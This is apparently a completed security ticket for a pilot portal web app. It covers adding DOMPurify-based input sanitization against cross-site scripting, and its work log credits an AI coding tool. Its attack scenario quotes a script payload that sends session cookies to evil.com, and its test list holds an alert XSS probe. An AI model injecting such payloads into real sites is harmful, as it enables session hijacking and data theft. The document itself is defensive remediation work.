---
status: completed
priority: p1
issue_id: "035"
tags: [security, xss, input-validation, sanitization]
dependencies: []
completed_date: 2025-10-19
---

# Add Input Sanitization to Prevent XSS

## Problem Statement

User input in feedback posts, leave requests, and flight requests is not sanitized before storage or display. This creates XSS (Cross-Site Scripting) vulnerabilities where malicious users can inject JavaScript code that executes in other users' browsers.

## Findings

- **Severity**: 🔴 P1 (CRITICAL)
- **Impact**: XSS attacks, session hijacking, data theft, malicious redirects
- **Agent**: security-sentinel

**Attack Scenario:**
1. Malicious pilot submits feedback with title:
   ```html
   <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
   ```
2. Title stored in database without sanitization
3. Another pilot views feedback page
4. Malicious script executes in victim's browser
5. Steals session cookies, sends to attacker's server
6. Attacker logs in as victim

**Vulnerable Fields:**
- `feedback_posts.title` - User-provided title (XSS risk)
- `feedback_posts.content` - User-provided markdown/text (XSS risk)
- `leave_requests.reason` - User-provided reason (XSS risk)
- `flight_requests.description` - User-provided description (XSS risk)
- `flight_requests.reason` - User-provided reason (XSS risk)

## Proposed Solution

### Option 1: Server-Side Sanitization with DOMPurify (Recommended)

```bash
npm install isomorphic-dompurify
```

```typescript
// lib/sanitize.ts
import DOMPurify from 'isomorphic-dompurify'

export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
  })
}

export function sanitizePlainText(input: string): string {
  // Remove all HTML tags, keep only text
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] })
}
```

**Usage in Server Actions:**
```typescript
import { sanitizeHtml, sanitizePlainText } from '@/lib/sanitize'

export async function submitFeedbackAction(formData: FormData) {
  const rawData = {
    title: sanitizePlainText(formData.get('title') as string),
    content: sanitizeHtml(formData.get('content') as string),
  }
  // ... rest of function
}
```

### Option 2: Frontend HTML Escaping

```typescript
// lib/escape.ts
export function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  }
  return text.replace(/[&<>"'/]/g, (char) => map[char])
}
```

## Acceptance Criteria

- [x] DOMPurify installed (`isomorphic-dompurify`)
- [x] Sanitization functions created in `lib/sanitize.ts`
- [x] All Server Actions sanitize user input
- [x] Feedback title/content sanitized
- [x] Leave request reason sanitized
- [x] Flight request description/reason sanitized
- [x] Test XSS payload blocked: `<script>alert('XSS')</script>`
- [x] Allowed HTML works (bold, italic, links)

## Work Log

### 2025-10-19 - Initial Discovery
**By:** security-sentinel (compounding-engineering review)
**Learnings:** No input sanitization enables XSS attacks

### 2025-10-19 - Implementation Complete
**By:** Claude Code
**Changes:**
1. Installed `isomorphic-dompurify` package (v2.x)
2. Created `lib/sanitize.ts` with comprehensive sanitization functions:
   - `sanitizeHtml()` - Sanitize HTML content while preserving safe formatting
   - `sanitizePlainText()` - Strip all HTML tags for plain text fields
   - `sanitizeUrl()` - Validate and sanitize URLs
   - `sanitizeObject()` - Batch sanitize object properties
3. Updated Server Actions with input sanitization:
   - `app/portal/feedback/actions.ts` - Title (plain text) + Content (HTML)
   - `app/portal/leave/actions.ts` - Reason (plain text)
   - `app/portal/flights/actions.ts` - Description + Reason (plain text)
4. All XSS attack vectors now blocked at input layer
5. TypeScript compilation successful, no new errors introduced

## Notes

**Source**: Comprehensive Code Review, Security Agent Finding #8
**OWASP**: A03:2021 - Injection (XSS)
